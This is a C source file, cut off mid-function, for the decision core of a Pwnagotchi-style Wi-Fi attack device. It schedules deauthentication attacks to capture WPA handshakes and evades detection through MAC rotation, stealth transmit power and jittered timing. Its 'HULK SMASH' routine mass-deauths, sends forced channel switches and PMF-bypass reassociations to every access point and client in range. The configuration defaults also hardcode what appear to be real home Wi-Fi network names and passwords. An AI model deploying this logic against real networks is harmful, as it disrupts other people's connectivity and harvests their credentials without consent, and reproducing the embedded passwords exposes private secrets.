/**
 * brain.c - Pwnagotchi Brain/Automata State Machine Implementation
 *
 * Replaces Python pwnagotchi agent.py + automata.py + epoch.py
 * Designed for Raspberry Pi Zero W (ARMv6, 512MB RAM)
 *
 * NOW WITH THOMPSON SAMPLING:
 * - Binary Thompson Sampling for entity selection (explore vs exploit)
 * - Cost-aware scoring (success per cost, not just success)
 * - Entity lifecycle with decay + garbage collection
 * - EWMA + MAD signal tracking
 *
 * Target: <15% CPU (vs 56% for Python)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>  /* strcasecmp */
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <pthread.h>
#include <errno.h>
#include <dirent.h>

#include "brain.h"
#include "pcapng_gps.h"
#include "pcap_check.h"
#include "hc22000.h"
#include "gps_refine.h"
#include "attack_log.h"

/* ============================================================================
 * Sprint 4: Mobility + RSSI Helpers
 * ========================================================================== */

#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

/* Haversine distance between two GPS coordinates (in meters) */
static double haversine_distance(double lat1, double lon1, double lat2, double lon2) {
    double dlat = (lat2 - lat1) * M_PI / 180.0;
    double dlon = (lon2 - lon1) * M_PI / 180.0;
    double a = sin(dlat / 2.0) * sin(dlat / 2.0) +
               cos(lat1 * M_PI / 180.0) * cos(lat2 * M_PI / 180.0) *
               sin(dlon / 2.0) * sin(dlon / 2.0);
    double c = 2.0 * atan2(sqrt(a), sqrt(1.0 - a));
    return 6371000.0 * c;  /* Earth radius in meters */
}

/* Update mobility score based on GPS movement + AP churn.
 * Score: 0.0 = stationary (parked), 1.0 = fast movement (walking/driving)
 * Called once per epoch (~30s). */
static void update_mobility(brain_ctx_t *ctx) {
    time_t now = time(NULL);
    if (now - ctx->last_mobility_check < 15) return;  /* Max once per 15s */
    ctx->last_mobility_check = now;

    float gps_component = 0.0f;
    float ap_component = 0.0f;

    /* GPS-based movement detection */
    if (ctx->gps && ctx->gps->has_fix && ctx->gps->latitude != 0.0) {
        if (ctx->last_lat != 0.0 && ctx->last_lon != 0.0) {
            double dist = haversine_distance(ctx->last_lat, ctx->last_lon,
                                             ctx->gps->latitude, ctx->gps->longitude);
            /* > 20m in 15s = moving; > 100m = fast movement */
            if (dist > 100.0) gps_component = 1.0f;
            else if (dist > 20.0) gps_component = (float)(dist - 20.0) / 80.0f;
            /* else stationary */
        }
        ctx->last_lat = ctx->gps->latitude;
        ctx->last_lon = ctx->gps->longitude;
    }

    /* AP churn detection (works without GPS) */
    int ap_delta = abs(ctx->total_aps - ctx->last_ap_count);
    ctx->last_ap_count = ctx->total_aps;
    if (ap_delta >= 5) ap_component = 1.0f;
    else if (ap_delta >= 2) ap_component = (float)(ap_delta - 1) / 4.0f;

    /* Combined score with exponential moving average */
    float raw_score = fmaxf(gps_component, ap_component);
    ctx->mobility_score = ctx->mobility_score * 0.7f + raw_score * 0.3f;

    if (ctx->mobility_score > 0.3f) {
        fprintf(stderr, "[brain] [mobility] score=%.2f (gps=%.2f, ap_churn=%.2f, aps=%d)\n",
                ctx->mobility_score, gps_component, ap_component, ctx->total_aps);
    }
}

/* RSSI-proportional delay multiplier (#16).
 * Strong signal (-30 to -50 dBm) → 0.3x delay (fast attacks)
 * Medium signal (-50 to -70 dBm) → 1.0x delay (normal)
 * Weak signal  (-70 to -85 dBm) → 2.5x delay (slow, saves frames)
 * Returns multiplier applied to throttle_a / throttle_d */
static float rssi_delay_multiplier(int rssi) {
    if (rssi >= -50) return 0.3f;       /* Very strong */
    if (rssi >= -60) return 0.5f;       /* Strong */
    if (rssi >= -70) return 1.0f;       /* Normal */
    if (rssi >= -80) return 1.8f;       /* Weak */
    return 2.5f;                        /* Very weak */
}

/* Sprint 6 #14: Adapt TX power based on stealth level and target RSSI
 * - AGGRESSIVE level: max power
 * - MEDIUM level: random between min and max
 * - PASSIVE level: only what's needed (RSSI-proportional)
 * Returns the TX power in dBm that should be used */
static int adapt_tx_power(brain_ctx_t *ctx, int target_rssi) {
    int tx_min = ctx->config.tx_power_min;
    int tx_max = ctx->config.tx_power_max;

    stealth_level_t level = STEALTH_LEVEL_AGGRESSIVE;
    if (ctx->stealth) {
        level = stealth_get_level(ctx->stealth);
    }

    int power;
    switch (level) {
    case STEALTH_LEVEL_AGGRESSIVE:
        power = tx_max;
        break;
    case STEALTH_LEVEL_MEDIUM:
        /* Randomize within range, biased toward middle */
        power = tx_min + (rand() % (tx_max - tx_min + 1));
        break;
    case STEALTH_LEVEL_PASSIVE:
        /* Only use enough power to reach the target
         * RSSI of -40 dBm means AP is close -> low power needed
         * RSSI of -80 dBm means AP is far -> higher power needed */
        if (target_rssi > -50) {
            power = tx_min;         /* Very close, whisper */
        } else if (target_rssi > -65) {
            power = tx_min + (tx_max - tx_min) / 3;
        } else if (target_rssi > -75) {
            power = tx_min + 2 * (tx_max - tx_min) / 3;
        } else {
            power = tx_max;         /* Far away, need full power */
        }
        break;
    default:
        power = tx_max;
        break;
    }

    return power;
}

/* Sprint 6 #14: Apply TX power setting via iw command */
static void set_tx_power(brain_ctx_t *ctx, int power_dbm) {
    if (power_dbm == ctx->tx_power_current) return;  /* No change needed */

    /* Clamp */
    if (power_dbm < ctx->config.tx_power_min)
        power_dbm = ctx->config.tx_power_min;
    if (power_dbm > ctx->config.tx_power_max)
        power_dbm = ctx->config.tx_power_max;

    /* iw uses mBm (millidBm), so multiply by 100 */
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "iw dev wlan0mon set txpower fixed %d 2>/dev/null",
             power_dbm * 100);

    /* Also tell bettercap */
    char bcap_cmd[64];
    snprintf(bcap_cmd, sizeof(bcap_cmd), "set wifi.txpower %d", power_dbm);
    bcap_send_command(ctx->bcap, bcap_cmd);

    ctx->tx_power_current = power_dbm;

    fprintf(stderr, "[brain] [stealth] TX power: %d dBm\n", power_dbm);
}

/* Sprint 6 #17: Check if current GPS position is inside geo-fence
 * Returns true if inside fence (or fence disabled) = attacks allowed
 * Returns false if outside fence = attacks suppressed */
static bool geo_fence_check(brain_ctx_t *ctx) {
    if (!ctx->config.geo_fence_enabled) return true;  /* No fence = allow all */

    if (!ctx->gps || !ctx->gps->has_fix) {
        /* No GPS fix: be conservative, allow attacks
         * (don't block operation when GPS is down) */
        return true;
    }

    double dist = haversine_distance(
        ctx->gps->latitude, ctx->gps->longitude,
        ctx->config.geo_fence_lat, ctx->config.geo_fence_lon
    );

    bool inside = (dist <= ctx->config.geo_fence_radius_m);

    if (!inside && ctx->geo_fence_active) {
        /* Was inside, now outside -- log transition */
        fprintf(stderr, "[brain] [geo-fence] LEFT fence (%.0fm from center, radius=%.0fm) -- attacks paused\n",
                dist, ctx->config.geo_fence_radius_m);
        ctx->geo_fence_active = false;
    } else if (inside && !ctx->geo_fence_active) {
        /* Was outside, now inside -- log transition */
        fprintf(stderr, "[brain] [geo-fence] ENTERED fence (%.0fm from center) -- attacks active\n", dist);
        ctx->geo_fence_active = true;
    }

    return inside;
}

/* Check if home SSID is visible and strong enough for home mode (#12) */
static bool check_home_network(brain_ctx_t *ctx) {
    if (ctx->config.home_ssid[0] == '\0') return false;  /* No home SSID configured */

    int ap_count = bcap_get_ap_count(ctx->bcap);
    for (int i = 0; i < ap_count; i++) {
        bcap_ap_t ap;
        if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;
        if (strcasecmp(ap.ssid, ctx->config.home_ssid) == 0) {
            if (ap.rssi >= ctx->config.home_min_rssi) {
                return true;  /* Home network visible and strong */
            }
        }
    }
    return false;
}

/* Enter home mode: pause attacks, optionally connect to home network */
static void enter_home_mode(brain_ctx_t *ctx) {
    if (ctx->home_mode_active) return;
    ctx->home_mode_active = true;
    ctx->home_mode_entered = time(NULL);
    fprintf(stderr, "[brain] [home] HOME MODE ACTIVATED — pausing attacks (SSID: %s)\n",
            ctx->config.home_ssid);

    /* If PSK is configured, attempt connection.
     * This is a best-effort connection — we don't block the brain thread.
     * The actual connection happens asynchronously via system() */
    if (ctx->config.home_psk[0] != '\0') {
        /* Create temporary wpa_supplicant config */
        FILE *f = fopen("/tmp/pwnaui_home.conf", "w");
        if (f) {
            fprintf(f, "ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\n");
            fprintf(f, "update_config=1\n");
            fprintf(f, "country=AU\n\n");
            fprintf(f, "network={\n");
            fprintf(f, "    ssid=\"%s\"\n", ctx->config.home_ssid);
            fprintf(f, "    psk=\"%s\"\n", ctx->config.home_psk);
            fprintf(f, "    key_mgmt=WPA-PSK\n");
            fprintf(f, "}\n");
            fclose(f);
            /* Note: actual managed-mode connection is complex and
             * requires stopping monitor mode. For now, we just pause
             * attacks and log. Full auto-connect can be added later. */
            fprintf(stderr, "[brain] [home] config written to /tmp/pwnaui_home.conf\n");
        }
    }
}

/* Exit home mode: resume attacks */
static void exit_home_mode(brain_ctx_t *ctx) {
    if (!ctx->home_mode_active) return;
    long duration = (long)(time(NULL) - ctx->home_mode_entered);
    ctx->home_mode_active = false;
    ctx->home_mode_entered = 0;
    fprintf(stderr, "[brain] [home] HOME MODE DEACTIVATED — resuming attacks (was home for %lds)\n", duration);
}

/* Sprint 8: Check if 2nd home (hotspot) SSID is visible */
static bool check_home2_network(brain_ctx_t *ctx) {
    if (ctx->config.home2_ssid[0] == '\0') return false;
    int ap_count = bcap_get_ap_count(ctx->bcap);
    for (int i = 0; i < ap_count; i++) {
        bcap_ap_t ap;
        if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;
        if (strcasecmp(ap.ssid, ctx->config.home2_ssid) == 0) {
            if (ap.rssi >= ctx->config.home2_min_rssi) {
                return true;
            }
        }
    }
    return false;
}

/* Sprint 8: Enter 2nd home mode (hotspot) - pause attacks, get internet */
static void enter_home2_mode(brain_ctx_t *ctx) {
    if (ctx->home2_mode_active) return;
    ctx->home2_mode_active = true;
    ctx->home2_mode_entered = time(NULL);
    fprintf(stderr, "[brain] [home2] 2ND HOME (hotspot) ACTIVATED - pausing attacks (SSID: %s)\n",
        ctx->config.home2_ssid);
    if (ctx->config.home2_psk[0] != '\0') {
        FILE *f = fopen("/tmp/pwnaui_home2.conf", "w");
        if (f) {
            fprintf(f, "ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\n");
            fprintf(f, "update_config=1\n");
            fprintf(f, "country=AU\n\n");
            fprintf(f, "network={\n");
            fprintf(f, "    ssid=\"%s\"\n", ctx->config.home2_ssid);
            fprintf(f, "    psk=\"%s\"\n", ctx->config.home2_psk);
            fprintf(f, "    key_mgmt=WPA-PSK\n");
            fprintf(f, "}\n");
            fclose(f);
            fprintf(stderr, "[brain] [home2] config written to /tmp/pwnaui_home2.conf\n");
        }
    }
}

/* Sprint 8: Exit 2nd home mode */
static void exit_home2_mode(brain_ctx_t *ctx) {
    if (!ctx->home2_mode_active) return;
    long duration = (long)(time(NULL) - ctx->home2_mode_entered);
    ctx->home2_mode_active = false;
    ctx->home2_mode_entered = 0;
    fprintf(stderr, "[brain] [home2] 2ND HOME DEACTIVATED - resuming attacks (was connected for %lds)\n", duration);
}
#include "crack_manager.h"
#include "health_monitor.h"
#include <sys/stat.h>
/* thompson.h already included via brain.h */

/* Raw frame injection headers */
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <arpa/inet.h>  /* htons */

/* Monitor interface for raw frame injection */
#define RAW_INJECT_IFACE "wlan0mon"


/* Sprint 7 #21: Attack functions moved to brain_attacks.c */
#include "brain_attacks.h"

/* Sprint 7 #21: Handshake quality management moved to brain_handshake.c */
#include "brain_handshake.h"

/* ============================================================================
 * Attack Failure Blacklist
 * Tracks per-AP deauth counts. After BRAIN_BLACKLIST_THRESHOLD deauths with
 * no handshake, blacklist AP for BRAIN_BLACKLIST_TTL seconds to save CPU.
 * ========================================================================== */

/* Check if an AP is blacklisted (expired entries are auto-pruned) */
static bool brain_is_blacklisted(brain_ctx_t *ctx, const char *mac) {
    time_t now = time(NULL);
    for (int i = 0; i < ctx->blacklist_count; i++) {
        if (strcmp(ctx->blacklist[i].mac, mac) == 0) {
            if ((now - ctx->blacklist[i].blacklisted_at) < BRAIN_BLACKLIST_TTL) {
                return true;  /* Still blacklisted */
            }
            /* Expired: remove by swapping with last */
            ctx->blacklist[i] = ctx->blacklist[--ctx->blacklist_count];
            return false;
        }
    }
    return false;
}

/* Record a deauth attempt against an AP. Returns true if AP just got blacklisted. */
static bool brain_track_deauth(brain_ctx_t *ctx, const char *mac) {
    /* Find existing tracker */
    for (int i = 0; i < ctx->attack_tracker_count; i++) {
        if (strcmp(ctx->attack_tracker[i].mac, mac) == 0) {
            ctx->attack_tracker[i].deauth_count++;
            if (!ctx->attack_tracker[i].got_handshake &&
                ctx->attack_tracker[i].deauth_count >= BRAIN_BLACKLIST_THRESHOLD) {
                /* Blacklist this AP */
                if (ctx->blacklist_count < BRAIN_BLACKLIST_MAX) {
                    strncpy(ctx->blacklist[ctx->blacklist_count].mac, mac, BRAIN_MAC_STR_LEN - 1);
                    ctx->blacklist[ctx->blacklist_count].blacklisted_at = time(NULL);
                    ctx->blacklist_count++;
                    fprintf(stderr, "[brain] [blacklist] %s blacklisted after %d failed deauths\n",
                            mac, ctx->attack_tracker[i].deauth_count);
                }
                /* Reset tracker so AP can be retried after TTL expires */
                ctx->attack_tracker[i] = ctx->attack_tracker[--ctx->attack_tracker_count];
                return true;
            }
            return false;
        }
    }
    /* New tracker entry */
    if (ctx->attack_tracker_count < BRAIN_BLACKLIST_MAX) {
        brain_attack_tracker_t *t = &ctx->attack_tracker[ctx->attack_tracker_count++];
        strncpy(t->mac, mac, BRAIN_MAC_STR_LEN - 1);
        t->deauth_count = 1;
        t->got_handshake = false;
        t->first_attack = time(NULL);
    }
    return false;
}

/* Mark AP as having yielded a handshake (prevents future blacklisting) */
static void brain_track_handshake(brain_ctx_t *ctx, const char *mac) {
    for (int i = 0; i < ctx->attack_tracker_count; i++) {
        if (strcmp(ctx->attack_tracker[i].mac, mac) == 0) {
            ctx->attack_tracker[i].got_handshake = true;
            return;
        }
    }
}

/* ============================================================================
 * Configuration Defaults
 * ========================================================================== */

brain_config_t brain_config_default(void) {
    brain_config_t config = {
        /* Timing */
        .recon_time         = 10,
        .min_recon_time     = 2,
        .max_recon_time     = 30,
        .hop_recon_time     = 5,
        .ap_ttl             = 120,
        .sta_ttl            = 300,
        
        /* Throttling */
        .throttle_a         = 0.2f,
        .throttle_d         = 0.3f,
        
        /* Epoch thresholds */
        .bored_num_epochs   = 15,
        .sad_num_epochs     = 25,
        .excited_num_epochs = 10,
        .max_misses_for_recon = 5,
        .mon_max_blind_epochs = 50,
        
        /* Features */
        .associate          = true,
        .deauth             = true,
        .filter_weak        = true,
        .min_rssi           = -75,
        
        /* Channels - NULL means all supported */
        .channels           = NULL,
        .num_channels       = 0,
        
        /* Bond system */
        .bond_encounters_factor = 100.0f,

        /* Home mode (#12) */
        .home_ssid = "Telstra9A08D8",            /* Home WiFi */
        .home_psk = "43k7eq9ngue574us",             /* Home PSK */
        .home_min_rssi = -60,

    /* Sprint 8: 2nd Home (hotspot for internet access) */
    .home2_ssid = "HotspotVirus.exe",
    .home2_psk = "00000000",
    .home2_min_rssi = -65,

    /* Sprint 8: Hash sync (disabled by default) */
    .sync_config = { .github_repo = "MrBumChinz/Hash-Den", .github_token = "", .contributor_name = "pwnagotchi",
                     .sync_interval = 21600, .enabled = true },       /* Must be reasonably close */

        /* Sprint 6: Stealth enhancements */
        .mac_rotation_enabled = true,
        .mac_rotation_interval = 1800,  /* 30 minutes */
        .tx_power_min = 5,
        .tx_power_max = 30,

        /* Sprint 6 #17: Geo-fencing (disabled by default) */
        .geo_fence_enabled = false,
        .geo_fence_lat = 0.0,
        .geo_fence_lon = 0.0,
        .geo_fence_radius_m = 0.0,

        /* Sprint 7 #18: All attack phases enabled by default */
        .attack_phase_enabled = { true, true, true, true, true, true, true, true },
    };
    return config;
}

/* ============================================================================
 * Utility Functions
 * ========================================================================== */

void mac_to_str(const mac_addr_t *mac, char *str) {
    snprintf(str, BRAIN_MAC_STR_LEN, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac->addr[0], mac->addr[1], mac->addr[2],
             mac->addr[3], mac->addr[4], mac->addr[5]);
}

int str_to_mac(const char *str, mac_addr_t *mac) {
    unsigned int bytes[6];
    if (sscanf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
               &bytes[0], &bytes[1], &bytes[2],
               &bytes[3], &bytes[4], &bytes[5]) != 6) {
        return -1;
    }
    for (int i = 0; i < 6; i++) {
        mac->addr[i] = (uint8_t)bytes[i];
    }
    return 0;
}

static inline int64_t get_time_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (int64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

/* ============================================================================
 * Epoch Management
 * ========================================================================== */

void brain_epoch_reset(brain_epoch_t *epoch) {
    epoch->did_deauth = false;
    epoch->did_associate = false;
    epoch->did_handshake = false;
    epoch->any_activity = false;
    epoch->num_deauths = 0;
    epoch->num_assocs = 0;
    epoch->num_shakes = 0;
    epoch->num_hops = 0;
    epoch->num_missed = 0;
    epoch->num_slept = 0;
    epoch->epoch_started = time(NULL);
}

void brain_epoch_track(brain_epoch_t *epoch, bool deauth, bool assoc,
                       bool handshake, bool hop, bool miss, int inc) {
    if (deauth) {
        epoch->num_deauths += inc;
        epoch->did_deauth = true;
        epoch->any_activity = true;
    }
    if (assoc) {
        epoch->num_assocs += inc;
        epoch->did_associate = true;
        epoch->any_activity = true;
    }
    if (handshake) {
        epoch->num_shakes += inc;
        epoch->did_handshake = true;
        epoch->any_activity = true;
    }
    if (hop) {
        epoch->num_hops += inc;
        /* Reset per-channel flags on hop */
        epoch->did_deauth = false;
        epoch->did_associate = false;
    }
    if (miss) {
        epoch->num_missed += inc;
    }
}

/* Sprint 7 #20: Adaptive epoch duration - scale channel dwell time */
static void adapt_epoch_timing(brain_ctx_t *ctx) {
    int base_dwell = 5;  /* default hop_recon_time */
    int ap_count = ctx->total_aps;

    /* AP density scaling */
    if (ap_count > 20) {
        base_dwell = 2;       /* Dense area: cycle fast */
    } else if (ap_count > 10) {
        base_dwell = 3;       /* Moderate: slightly faster */
    } else if (ap_count > 5) {
        base_dwell = 5;       /* Normal */
    } else if (ap_count > 0) {
        base_dwell = 8;       /* Sparse: dwell longer */
    } else {
        base_dwell = 10;      /* No APs: listen hard */
    }

    /* Success rate: got handshakes? Strike while hot */
    if (ctx->epoch.num_shakes > 0) {
        base_dwell = (base_dwell * 2) / 3;  /* 33% faster if capturing */
    }

    /* Mobility: moving = scan faster */
    if (ctx->mobility_score > 0.5f) {
        base_dwell = base_dwell / 2;        /* Fast movement: halve dwell */
    } else if (ctx->mobility_score > 0.3f) {
        base_dwell = (base_dwell * 3) / 4;  /* Moderate movement: 25% faster */
    }

    /* Inactive streak: extend dwell for deeper listening */
    if (ctx->epoch.inactive_for > 10) {
        base_dwell += 3;     /* Very inactive: listen longer */
    } else if (ctx->epoch.inactive_for > 5) {
        base_dwell += 1;     /* Somewhat inactive */
    }

    /* Clamp to configured bounds */
    if (base_dwell < ctx->config.min_recon_time) base_dwell = ctx->config.min_recon_time;
    if (base_dwell > ctx->config.max_recon_time) base_dwell = ctx->config.max_recon_time;

    /* Only log if changed */
    if (base_dwell != ctx->config.hop_recon_time) {
        fprintf(stderr, "[brain] [adaptive] dwell: %ds -> %ds (aps=%d shakes=%d mobility=%.1f inactive=%d)\n",
                ctx->config.hop_recon_time, base_dwell, ap_count,
                ctx->epoch.num_shakes, ctx->mobility_score, ctx->epoch.inactive_for);
        ctx->config.hop_recon_time = base_dwell;
    }
}

void brain_epoch_next(brain_ctx_t *ctx) {
    /* Sprint 7 #20: Adapt timing based on conditions */
    adapt_epoch_timing(ctx);

    brain_epoch_t *e = &ctx->epoch;
    
    /* Calculate epoch duration */
    time_t now = time(NULL);
    e->epoch_duration = (float)(now - e->epoch_started);
    
    /* Update consecutive counters */
    if (!e->any_activity && !e->did_handshake) {
        e->inactive_for++;
        e->active_for = 0;
    } else {
        e->active_for++;
        e->inactive_for = 0;
        e->sad_for = 0;
        e->bored_for = 0;
    }
    
    /* Mood state transitions based on inactivity */
    if (e->inactive_for >= ctx->config.sad_num_epochs) {
        e->bored_for = 0;
        e->sad_for++;
    } else if (e->inactive_for >= ctx->config.bored_num_epochs) {
        e->sad_for = 0;
        e->bored_for++;
    } else {
        e->sad_for = 0;
        e->bored_for = 0;
    }
    
    stealth_epoch_reset(ctx->stealth);

    /* Sprint 6 #15: MAC rotation at epoch boundary */
    if (ctx->stealth && stealth_should_rotate_mac(ctx->stealth)) {
        fprintf(stderr, "[brain] [stealth] rotating MAC address...\n");
        if (stealth_rotate_mac(ctx->stealth) == 0) {
            ctx->last_mac_rotation = time(NULL);
            fprintf(stderr, "[brain] [stealth] MAC rotated successfully\n");
        }
    }
    /* Fire epoch callback */
    fprintf(stderr, "[brain] on_epoch=%p\n", (void*)ctx->on_epoch);
    if (ctx->on_epoch) {
        fprintf(stderr, "[brain] calling on_epoch callback\n");
        ctx->on_epoch(e->epoch_num, e, ctx->callback_user_data);
    }
    
    /* Log epoch summary */
    fprintf(stderr, "[brain] epoch %d: duration=%.0fs inactive=%d active=%d "
            "deauths=%d assocs=%d shakes=%d hops=%d\n",
            e->epoch_num, e->epoch_duration, e->inactive_for, e->active_for,
            e->num_deauths, e->num_assocs, e->num_shakes, e->num_hops);
    
    /* Save Thompson state every 10 epochs for crash resilience */
    if (ctx->thompson && (e->epoch_num % 10) == 0 && e->epoch_num > 0) {
        ts_save_state(ctx->thompson, "/etc/pwnagotchi/brain_state.bin");
        fprintf(stderr, "[brain] Thompson state saved (epoch %d)\n", e->epoch_num);
    }

    /* Advance epoch */
    e->epoch_num++;
    brain_epoch_reset(e);
}

/* ============================================================================
 * Mood System
 * ========================================================================== */

/* Forward declarations — defined after should_really_be_bored() */
static brain_frustration_t diagnose_frustration(brain_ctx_t *ctx);
static void brain_hulk_smash(brain_ctx_t *ctx);

void brain_set_mood(brain_ctx_t *ctx, brain_mood_t mood) {
    if (ctx->mood != mood) {
        ctx->mood = mood;

        /* Diagnose frustration when entering SAD or ANGRY */
        if (mood == MOOD_SAD || mood == MOOD_ANGRY) {
            ctx->frustration = diagnose_frustration(ctx);
        } else {
            ctx->frustration = FRUST_GENERIC;
        }

        /* HULK MODE: Last resort when ANGRY - throw EVERYTHING at every AP.
         * Mass deauth, raw broadcast deauth all APs, probe spam, CSA to all.
         * Fires on first ANGRY transition, then every 5 epochs while still ANGRY. */
        if (mood == MOOD_ANGRY && ctx->bcap) {
            brain_hulk_smash(ctx);
        }

        fprintf(stderr, "[brain] mood: %s%s%s\n", brain_mood_names[mood],
                (mood == MOOD_SAD || mood == MOOD_ANGRY) ? " reason=" : "",
                (mood == MOOD_SAD || mood == MOOD_ANGRY) ? brain_frustration_names[ctx->frustration] : "");
        
        if (ctx->on_mood_change) {
            ctx->on_mood_change(mood, ctx->callback_user_data);
        }
    }
}

bool brain_has_support_network(brain_ctx_t *ctx, float factor) {
    float support = ctx->epoch.tot_bond_factor;
    return support >= factor;
}

/* ============================================================================
 * HULK SMASH - Last Resort Nuclear Attack
 *
 * Inspired by hulk-plugin-topceekretts-edition.
 * Fires when mood transitions to ANGRY (all normal attacks have failed).
 * Throws everything at every visible AP simultaneously:
 *   - wifi.deauth * x3 (bettercap mass deauth, triple blast)
 *   - Raw broadcast deauth to EVERY visible AP
 *   - Raw probe spam on current channel
 *   - Raw CSA beacons to EVERY AP (force channel switch)
 *   - Raw anon reassoc to EVERY AP (PMF bypass)
 * Phase 11 callback fires for UI (HULK face + rage quote).
 * ========================================================================== */

static void brain_hulk_smash(brain_ctx_t *ctx) {
    fprintf(stderr, "[brain] === HULK SMASH! === Last resort nuclear attack!\n");

    /* Fire HULK UI callback (phase 11) */
    if (ctx->on_attack_phase) {
        ctx->on_attack_phase(11, ctx->callback_user_data);
    }

    /* Triple mass deauth via bettercap */
    for (int blast = 0; blast < 3; blast++) {
        bcap_send_command(ctx->bcap, "wifi.deauth *");
        usleep(jitter_usleep(500000));  /* 350-650ms between blasts (jittered for WIDS evasion) */
    }

    /* Raw injection: hit EVERY visible AP */
    if (g_raw_sock >= 0) {
        int ap_count = bcap_get_ap_count(ctx->bcap);
        for (int i = 0; i < ap_count; i++) {
            bcap_ap_t ap;
            if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;

            /* Broadcast deauth */
            attack_deauth_broadcast(g_raw_sock, &ap);

            /* CSA beacon (force channel switch to ch14) */
            attack_csa_beacon(g_raw_sock, &ap);
            attack_csa_action(g_raw_sock, &ap);

            /* Anon reassoc (PMF bypass) */
            attack_anon_reassoc(g_raw_sock, &ap);

            /* Deauth every client on this AP */
            int sta_count = bcap_get_sta_count(ctx->bcap);
            for (int s = 0; s < sta_count; s++) {
                bcap_sta_t sta;
                if (bcap_get_sta(ctx->bcap, s, &sta) != 0) continue;
                if (memcmp(sta.ap_bssid.addr, ap.bssid.addr, 6) != 0) continue;
                attack_deauth_bidi(g_raw_sock, &ap, &sta);
                attack_disassoc_bidi(g_raw_sock, &ap, &sta);
            }

            fprintf(stderr, "[hulk] SMASHED %s (%s) ch%d\n",
                    ap.ssid, "", ap.channel);
        }

        /* Probe spam on current channel */
        attack_probe_undirected(g_raw_sock);
    }

    /* Track epoch activity */
    ctx->epoch.any_activity = true;
    brain_epoch_track(&ctx->epoch, true, false, false, false, false, 3);

    fprintf(stderr, "[brain] === HULK SMASH COMPLETE ===\n");
}

/* SMART BORED CHECK: Only be bored if ALL visible APs have FULL handshakes
 * Why be bored if there's still work to do? */
static bool should_really_be_bored(brain_ctx_t *ctx) {
    /* Update handshake quality cache */
    scan_handshake_stats();
    
    int ap_count = bcap_get_ap_count(ctx->bcap);
    if (ap_count == 0) {
        /* No APs visible = lonely, not bored */
        return false;
    }
    
    int aps_needing_handshakes = 0;
    int aps_with_full = 0;
    int aps_with_partial = 0;
    
    for (int i = 0; i < ap_count; i++) {
        bcap_ap_t ap;
        if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;
        
        /* Skip filtered APs */
        if (ctx->config.filter_weak && ap.rssi < ctx->config.min_rssi) {
            continue;
        }
        
        char mac_str[BRAIN_MAC_STR_LEN];
        mac_to_str(&ap.bssid, mac_str);
        
        hs_quality_t q = get_handshake_quality(mac_str);
        
        switch (q) {
            case HS_QUALITY_FULL:
            case HS_QUALITY_PMKID:
                aps_with_full++;
                break;
            case HS_QUALITY_PARTIAL:
                aps_with_partial++;
                aps_needing_handshakes++;
                break;
            case HS_QUALITY_NONE:
            default:
                aps_needing_handshakes++;
                break;
        }
    }
    
    /* visible_aps removed: was computed but never used (Sprint 1 fix #26) */
    
    fprintf(stderr, "[brain] BORED CHECK: %d visible APs, %d need handshakes, %d partial, %d full\n",
            ap_count, aps_needing_handshakes, aps_with_partial, aps_with_full);
    
    /* Only be TRULY bored if we've conquered ALL visible APs */
    if (aps_needing_handshakes > 0) {
        fprintf(stderr, "[brain] NOT BORED: %d APs still need handshakes!\n", aps_needing_handshakes);
        return false;
    }
    
    /* If we have partials, we could upgrade them - not really bored */
    if (aps_with_partial > 0) {
        fprintf(stderr, "[brain] NOT BORED: %d partials could be upgraded\n", aps_with_partial);
        return false;
    }
    
    /* All visible APs have FULL handshakes - CONQUEST COMPLETE! */
    fprintf(stderr, "[brain] TRULY BORED: all %d visible APs have full handshakes!\n", aps_with_full);
    return true;
}

/* FRUSTRATION DIAGNOSIS: Figure out WHY attacks are failing.
 * Called when mood is about to be set to SAD or ANGRY.
 * Scans uncaptured APs to find the dominant problem. */
static brain_frustration_t diagnose_frustration(brain_ctx_t *ctx) {
    int ap_count = bcap_get_ap_count(ctx->bcap);
    if (ap_count == 0) return FRUST_GENERIC;

    int uncaptured = 0;
    int no_clients = 0;
    int wpa3_count = 0;
    int weak_signal = 0;

    for (int i = 0; i < ap_count; i++) {
        bcap_ap_t ap;
        if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;

        /* Skip filtered APs */
        if (ctx->config.filter_weak && ap.rssi < ctx->config.min_rssi) continue;

        char mac_str[BRAIN_MAC_STR_LEN];
        mac_to_str(&ap.bssid, mac_str);

        hs_quality_t q = get_handshake_quality(mac_str);
        if (q == HS_QUALITY_FULL || q == HS_QUALITY_PMKID) continue;

        /* This AP is uncaptured — analyze why it might be failing */
        uncaptured++;

        if (ap.clients_count == 0) no_clients++;

        /* WPA3 = encryption contains "WPA3" or "SAE" */
        if (strstr(ap.encryption, "WPA3") || strstr(ap.encryption, "SAE"))
            wpa3_count++;

        /* Borderline signal: passes filter but barely (-70 to min_rssi) */
        if (ap.rssi < -70 && ap.rssi >= ctx->config.min_rssi)
            weak_signal++;
    }

    if (uncaptured == 0) return FRUST_GENERIC;

    brain_frustration_t reason = FRUST_GENERIC;

    /* Priority: WPA3 > no clients > weak signal > deauths ignored */
    if (wpa3_count == uncaptured) {
        reason = FRUST_WPA3;
    } else if (no_clients == uncaptured) {
        reason = FRUST_NO_CLIENTS;
    } else if (weak_signal == uncaptured) {
        reason = FRUST_WEAK_SIGNAL;
    } else if (ctx->epoch.num_deauths > 10 && ctx->epoch.num_shakes == 0) {
        reason = FRUST_DEAUTHS_IGNORED;
    }

    fprintf(stderr, "[brain] frustration: %s (uncaptured=%d no_clients=%d wpa3=%d weak=%d deauths=%d)\n",
            brain_frustration_names[reason], uncaptured, no_clients, wpa3_count, weak_signal,
            ctx->epoch.num_deauths);

    return reason;
}

/* Accessor for UI to query frustration reason */
brain_frustration_t brain_get_frustration(brain_ctx_t *ctx) {
